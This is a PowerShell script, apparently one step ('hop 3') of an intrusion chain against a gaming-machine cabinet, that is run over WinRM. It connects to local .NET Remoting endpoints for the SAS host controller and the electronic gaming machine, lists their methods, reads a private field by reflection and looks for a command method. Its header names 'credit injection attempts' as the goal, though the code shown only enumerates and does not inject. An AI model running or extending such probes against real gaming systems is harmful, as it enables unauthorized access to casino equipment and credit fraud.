# Hop 3 Spoof Probe - Full interface enumeration + credit injection attempts
# Run on cabinet 10.0.0.90 via WinRM

$ErrorActionPreference = 'Continue'
$hostUrl = "http://localhost:50011/SASControler1"
$egmUrl = "http://localhost:50010/GM2AU"

Write-Host "=== HOP 3 SPOOF PROBE ===" -ForegroundColor Cyan
Write-Host "HOST endpoint: $hostUrl"
Write-Host "EGM endpoint: $egmUrl"
Write-Host ""

# Try HOST endpoint
Write-Host "--- Probing HOST (:50011/SASControler1) ---" -ForegroundColor Yellow
try {
    $hostChannel = New-Object System.Runtime.Remoting.Channels.Http.HttpChannel
    [System.Runtime.Remoting.Channels.ChannelServices]::RegisterChannel($hostChannel, $false)
    
    $hostProxy = [System.Activator]::GetObject([System.MarshalByRefObject], $hostUrl)
    Write-Host "[+] HOST proxy obtained: $($hostProxy.GetType().FullName)"
    
    # Enumerate all methods
    $methods = $hostProxy.GetType().GetMethods() | Select-Object -ExpandProperty Name
    Write-Host "[*] HOST methods:"
    $methods | ForEach-Object { Write-Host "    $_" }
    
    # Try to get WAT command
    try {
        $deviceClass = $hostProxy.GetType().GetField("deviceClassBase", [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Instance)
        if ($deviceClass) {
            $dcValue = $deviceClass.GetValue($hostProxy)
            Write-Host "[*] deviceClassBase: $($dcValue)"
        }
    } catch {
        Write-Host "[!] deviceClassBase: $_"
    }
    
    # Try GetNewCommand
    try {
        $getNewCmd = $hostProxy.GetType().GetMethod("GetNewCommand")
        if ($getNewCmd) {
            Write-Host "[+] GetNewCommand found"
        }
    } catch {
        Write-Host "[!] GetNewCommand: $_"
    }
    
} catch {
    Write-Host "[!] HOST probe failed: $_"
}

Write-Host ""

# Try EGM endpoint
Write-Host "--- Probing EGM (:50010/GM2AU) ---" -ForegroundColor Yellow
try {
    $egmChannel = New-Object System.Runtime.Remoting.Channels.Http.HttpChannel
    [System.Runtime.Remoting.Channels.ChannelServices]::RegisterChannel($egmChannel, $false)
    
    $egmProxy = [System.Activator]::GetObject([System.MarshalByRefObject], $egmUrl)
    Write-Host "[+] EGM proxy obtained: $($egmProxy.GetType().FullName)"
    
    # Enumerate all methods
    $methods = $egmProxy.GetType().GetMethods() | Select-Object -ExpandProperty Name
    Write-Host "[*] EGM methods:"
    $methods | ForEach-Object { Write-Host "    $_" }
    
} catch {
    Write-Host "[!] EGM probe failed: $_"
}

Write-Host ""
Write-Host "=== PROBE COMPLETE ==="
